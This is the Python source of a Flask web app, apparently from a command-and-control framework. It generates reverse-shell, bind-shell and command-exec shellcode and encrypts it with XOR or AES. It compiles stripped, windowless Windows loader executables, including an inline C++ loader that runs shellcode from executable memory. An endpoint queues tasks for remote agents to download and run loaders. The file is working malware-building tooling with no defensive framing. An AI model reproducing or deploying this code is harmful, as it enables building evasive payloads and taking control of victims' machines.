from flask import Flask, render_template, request, jsonify, send_file
from modules.shellcode_generator import ShellcodeGenerator
import os
import sys
import base64
import tempfile
import subprocess
import platform
import random
import string
from C2_Server.shellcode_gen import shellcode_gen  # Use the real msfvenom-based generator

# Add the parent directory to the path to import from C2_Server
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from C2_Server.generate_loader import generate_loader, check_mingw

app = Flask(__name__)
shellcode_gen = ShellcodeGenerator()

@app.route('/')
def index():
    return render_template('shellcode.html')

@app.route('/generate', methods=['POST'])
def generate_shellcode():
    try:
        data = request.get_json()
        shellcode_type = data.get('type')
        platform = data.get('platform', 'windows')
        encoding = data.get('encoding', 'base64')
        encryption = data.get('encryption', 'none')
        key = data.get('key', '')
        shellcode = None

        if shellcode_type == 'reverse_shell' or shellcode_type == 'reverse':
            host = data.get('host')
            port = data.get('port')

            if not host or not port:
                return jsonify({'error': 'Host and port are required for reverse shell'}), 400

            try:
                port = int(port)
            except ValueError:
                return jsonify({'error': 'Port must be an integer'}), 400

            shellcode = shellcode_gen.generate_reverse_shell(host, port, platform)

        elif shellcode_type == 'bind_shell' or shellcode_type == 'bind':
            port = data.get('port')

            if not port:
                return jsonify({'error': 'Port is required for bind shell'}), 400

            try:
                port = int(port)
            except ValueError:
                return jsonify({'error': 'Port must be an integer'}), 400

            shellcode = shellcode_gen.generate_bind_shell(port, platform)

        elif shellcode_type == 'exec':
            command = data.get('command')

            if not command:
                return jsonify({'error': 'Command is required for exec shellcode'}), 400

            shellcode = shellcode_gen.generate_exec(command, platform)

        else:
            return jsonify({'error': 'Invalid shellcode type'}), 400

        if shellcode is None:
            return jsonify({'error': 'Failed to generate shellcode'}), 500

        # Apply encryption if needed
        if encryption != 'none':
            if encryption == 'xor':
                shellcode = shellcode_gen.xor_encrypt(shellcode, key or 'defaultxor')
            elif encryption == 'aes':
                shellcode = shellcode_gen.aes_encrypt(shellcode, key or 'defaultaes')

        # Encode shellcode
        encoded_shellcode = shellcode_gen.encode_shellcode(shellcode, encoding)
        if encoded_shellcode is None:
            return jsonify({'error': 'Failed to encode shellcode'}), 500

        return jsonify({
            'success': True,
            'shellcode': encoded_shellcode.decode() if isinstance(encoded_shellcode, bytes) else encoded_shellcode,
            'encoding': encoding
        })

    except Exception as e:
        return jsonify({'error': f'Unexpected server error: {str(e)}'}), 500

@app.route('/generate_loader_exe', methods=['POST'])
def generate_loader_exe():
    """
    Generate an executable loader for the provided shellcode
    
    Expected payload (either JSON or form data):
    - shellcode: base64_encoded_shellcode
    - encryption: encryption type ('aes' or 'xor')
    - key: optional encryption key
    
    Returns:
        The compiled executable file for download
    """
    try:
        # Debug: Log the incoming request
        print(f"Received request to generate loader. Content-Type: {request.headers.get('Content-Type')}")
        
        # Extract shellcode from either JSON or form data
        shellcode_b64 = None
        encryption_type = 'aes'  # Default to AES
        key = None
        
        if request.is_json:
            data = request.get_json()
            if data:
                shellcode_b64 = data.get('shellcode')
                encryption_type = data.get('encryption', 'aes')
                key = data.get('key')
        else:
            # Try form data
            shellcode_b64 = request.form.get('shellcode')
            encryption_type = request.form.get('encryption', 'aes')
            key = request.form.get('key')
            
        if not shellcode_b64:
            return jsonify({'error': 'Shellcode is required'}), 400
            
        print(f"Received shellcode (length: {len(shellcode_b64)}), encryption: {encryption_type}")
        
        # Import modules needed for encryption
        from encrypt_aes import encrypt_shellcode, generate_random_key
        import os
        import tempfile
        
        # Decode shellcode
        try:
            shellcode_bytes = base64.b64decode(shellcode_b64)
        except:
            return jsonify({'error': 'Invalid base64 encoded shellcode'}), 400
        
        # Choose appropriate template based on encryption type
        if encryption_type.lower() == 'aes':
            template_path = os.path.join(os.path.dirname(__file__), "cpp_templates/dynamic_shellcode_loader_template.cpp")
            
            # Generate random AES key and IV if none provided
            aes_key = key.encode() if key else generate_random_key(16)
            aes_iv = generate_random_key(16)  # Always generate random IV
            
            # Encrypt shellcode
            encryption_result = encrypt_shellcode(shellcode_bytes, aes_key, aes_iv)
            encrypted_b64 = encryption_result['encrypted']
            key_str = encryption_result['key_str']
            iv_str = encryption_result['iv_str']
            
            # Load template and replace placeholders
            with open(template_path, "r") as f:
                template = f.read()
                
            loader_code = template.replace("###ENCRYPTED_SHELLCODE###", encrypted_b64)
            loader_code = loader_code.replace("###AES_KEY###", key_str)
            loader_code = loader_code.replace("###AES_IV###", iv_str)
            
        elif encryption_type.lower() == 'xor':
            template_path = os.path.join(os.path.dirname(__file__), "cpp_templates/xor_shellcode_loader_template.cpp")
            
            # Generate random XOR key if none provided
            xor_key = key if key else ''.join(random.choices(string.ascii_letters + string.digits, k=8))
            
            # XOR encrypt shellcode
            encrypted_bytes = shellcode_gen.xor_encrypt(shellcode_bytes, xor_key)
            encrypted_b64 = base64.b64encode(encrypted_bytes).decode()
            
            # Load template and replace placeholders
            with open(template_path, "r") as f:
                template = f.read()
                
            loader_code = template.replace("###ENCRYPTED_SHELLCODE###", encrypted_b64)
            loader_code = loader_code.replace("###XOR_KEY###", xor_key)
            
        else:
            return jsonify({'error': f'Unsupported encryption type: {encryption_type}'}), 400
            
        # Create output paths
        output_dir = os.path.join(os.path.dirname(__file__), "compiled")
        os.makedirs(output_dir, exist_ok=True)
        cpp_path = os.path.join(output_dir, f"loader_{os.urandom(4).hex()}.cpp")
        exe_path = os.path.splitext(cpp_path)[0] + '.exe'
        
        # Write the loader code to file
        with open(cpp_path, "w") as f:
            f.write(loader_code)
        
        # Compile the code
        if not check_mingw():
            return jsonify({'error': 'MinGW compiler (x86_64-w64-mingw32-g++) not found! Please install it to compile the loader.'}), 500
            
        compile_cmd = [
            "x86_64-w64-mingw32-g++", 
            cpp_path,
            "-o", exe_path,
            "-mwindows",
            "-s",  # Strip symbols
            "-static-libgcc", "-static-libstdc++",  # Static linking
        ]
        
        result = subprocess.run(
            compile_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        # Clean up the source file
        try:
            os.unlink(cpp_path)
        except:
            pass
        
        if result.returncode != 0:
            error_msg = result.stderr.decode()
            return jsonify({'error': f'Compilation failed: {error_msg}'}), 500
            
        print(f"Generated loader at {exe_path}")
            
        # Return the file for download
        try:
            # Flask 2.0+ uses download_name
            return send_file(
                exe_path,
                as_attachment=True,
                download_name="shellcode_loader.exe",
                mimetype="application/octet-stream"
            )
        except TypeError:
            # Flask <2.0 uses attachment_filename
            return send_file(
                exe_path,
                as_attachment=True,
                attachment_filename="shellcode_loader.exe",
                mimetype="application/octet-stream"
            )
        
    except Exception as e:
        print(f"Error in generate_loader_exe: {str(e)}")
        return jsonify({'error': f'Error generating loader: {str(e)}'}), 500

@app.route('/compile_shellcode_exe', methods=['POST'])
def compile_shellcode_exe():
    """
    Compile a regular (non-encrypted) executable for the provided shellcode
    
    Expected JSON payload:
    {
        "shellcode": "base64_encoded_shellcode",
        "platform": "windows"  # Optional, defaults to windows
    }
    
    Returns:
        The compiled executable file for download
    """
    try:
        # Validate request
        if not request.is_json:
            return jsonify({'error': 'Expected JSON payload'}), 400
            
        data = request.get_json()
        if not data or 'shellcode' not in data:
            return jsonify({'error': 'Shellcode is required'}), 400
            
        shellcode_b64 = data.get('shellcode')
        platform = data.get('platform', 'windows')
        
        if platform != 'windows':
            return jsonify({'error': 'Only Windows platform is supported for .exe compilation'}), 400
        
        # Decode shellcode - handle different formats
        try:
            # Try to parse directly if it's base64
            try:
                shellcode_bytes = base64.b64decode(shellcode_b64)
            except:
                # If it fails, it might be formatted code, clean it
                if shellcode_b64.startswith('b\'\\x') or shellcode_b64.startswith('"\\x'):
                    # Python-style shellcode format: b'\x90\x90...'
                    # Remove prefix/suffix and split into bytes
                    cleaned = shellcode_b64.replace('b\'', '').replace('\'', '')
                    cleaned = cleaned.replace('"', '').replace('\\x', '')
                    # Convert hex pairs to bytes
                    shellcode_bytes = bytes.fromhex(cleaned)
                elif ' ' in shellcode_b64:
                    # Raw bytes format with spaces: "90 90 90..."
                    cleaned = shellcode_b64.replace(' ', '')
                    shellcode_bytes = bytes.fromhex(cleaned)
                else:
                    # Last attempt - try hex decoding
                    try:
                        shellcode_bytes = bytes.fromhex(shellcode_b64)
                    except:
                        raise ValueError("Could not decode shellcode - invalid format")
                        
            # Create C-style hex representation
            shellcode_hex = ''.join([f'\\x{b:02x}' for b in shellcode_bytes])
        except Exception as e:
            print(f"Shellcode decode error: {str(e)}")
            return jsonify({'error': f'Failed to decode shellcode: {str(e)}'}), 400
        
        # Create tempfiles for source and exe
        with tempfile.NamedTemporaryFile(suffix='.cpp', delete=False) as cpp_file:
            cpp_path = cpp_file.name
            
            # Create loader code
            cpp_code = f"""#include <windows.h>
#include <iostream>

// Shellcode
unsigned char shellcode[] = "{shellcode_hex}";

int main() {{
    // Allocate memory for shellcode
    LPVOID lpAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!lpAlloc) {{
        std::cerr << "Memory allocation failed: " << GetLastError() << std::endl;
        return 1;
    }}

    // Copy shellcode to allocated memory
    memcpy(lpAlloc, shellcode, sizeof(shellcode));

    // Execute shellcode
    DWORD threadId;
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpAlloc, NULL, 0, &threadId);
    if (!hThread) {{
        std::cerr << "Thread creation failed: " << GetLastError() << std::endl;
        VirtualFree(lpAlloc, 0, MEM_RELEASE);
        return 1;
    }}

    // Wait for shellcode execution to complete
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(lpAlloc, 0, MEM_RELEASE);

    return 0;
}}"""
            cpp_file.write(cpp_code.encode())
            
        # Compile the code
        exe_path = os.path.splitext(cpp_path)[0] + '.exe'
        
        # Check for compiler - try MSVC (cl.exe) if on Windows, otherwise MinGW
        use_msvc = False
        
        if platform.system() == 'Windows':
            # Try to find cl.exe (MSVC compiler)
            try:
                # Check if cl.exe is available in PATH
                result = subprocess.run(
                    ["where", "cl.exe"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    check=False
                )
                if result.returncode == 0:
                    use_msvc = True
            except Exception as e:
                print(f"Error checking for cl.exe: {str(e)}")
                pass
        
        # If MSVC is available and we're on Windows, use it
        if use_msvc:
            compile_cmd = [
                "cl.exe",
                "/EHsc",
                "/nologo",
                "/O2",
                cpp_path,
                "/Fe" + exe_path,
                "/link",
                "/SUBSYSTEM:WINDOWS"
            ]
        else:
            # Check if MinGW is installed
            if not check_mingw():
                # Clean up temp file
                try:
                    os.unlink(cpp_path)
                except:
                    pass
                return jsonify({'error': 'No suitable compiler found. Please install MinGW (x86_64-w64-mingw32-g++) or Microsoft Visual C++ (cl.exe).'}), 500
                
            # Use MinGW
            compile_cmd = [
                "x86_64-w64-mingw32-g++", 
                cpp_path,
                "-o", exe_path,
                "-mwindows",
                "-s",  # Strip symbols
                "-static-libgcc", "-static-libstdc++",  # Static linking
            ]
        
        try:
            result = subprocess.run(
                compile_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                check=False
            )
        except Exception as e:
            # Clean up temp file
            try:
                os.unlink(cpp_path)
            except:
                pass
            return jsonify({'error': f'Compilation process failed: {str(e)}'}), 500
        
        # Clean up the source file
        try:
            os.unlink(cpp_path)
        except Exception as e:
            print(f"Warning: Could not delete temp file: {str(e)}")
        
        if result.returncode != 0:
            error_msg = result.stderr.decode()
            return jsonify({'error': f'Compilation failed: {error_msg}'}), 500
            
        # Check if the exe file was created
        if not os.path.exists(exe_path):
            return jsonify({'error': 'Compilation completed but executable was not created'}), 500
            
        # Return the executable
        try:
            # Flask 2.0+ uses download_name
            return send_file(
                exe_path,
                as_attachment=True,
                download_name="shellcode_loader.exe",
                mimetype="application/octet-stream"
            )
        except TypeError:
            # Flask <2.0 uses attachment_filename
            return send_file(
                exe_path,
                as_attachment=True,
                attachment_filename="shellcode_loader.exe",
                mimetype="application/octet-stream"
            )
        except Exception as e:
            return jsonify({'error': f'Error serving file: {str(e)}'}), 500
        
    except Exception as e:
        print(f"Unhandled error in compile_shellcode_exe: {str(e)}")
        return jsonify({'error': f'Error compiling shellcode executable: {str(e)}'}), 500

@app.route('/api/tasks', methods=['POST'])
def create_task():
    """
    Create a task for an agent to execute the loader
    
    Expected JSON payload:
    {
        "agent_id": "agent_identifier",
        "loader_url": "url_to_download_loader"
    }
    
    Returns:
        Task ID and status
    """
    try:
        data = request.get_json()
        agent_id = data.get('agent_id')
        loader_url = data.get('loader_url')
        
        if not agent_id or not loader_url:
            return jsonify({'error': 'Agent ID and loader URL are required'}), 400
            
        # Create task data
        task_data = {
            'module': 'run_loader',
            'params': {
                'loader_url': loader_url
            }
        }
        
        # In a real implementation, this would be sent to your C2 server's task queue
        # For this example, we'll just return success
        task_id = f"task_{os.urandom(4).hex()}"
        
        return jsonify({
            'success': True,
            'task_id': task_id,
            'message': f'Task created for agent {agent_id} to run loader from {loader_url}'
        })
        
    except Exception as e:
        return jsonify({'error': f'Error creating task: {str(e)}'}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001)
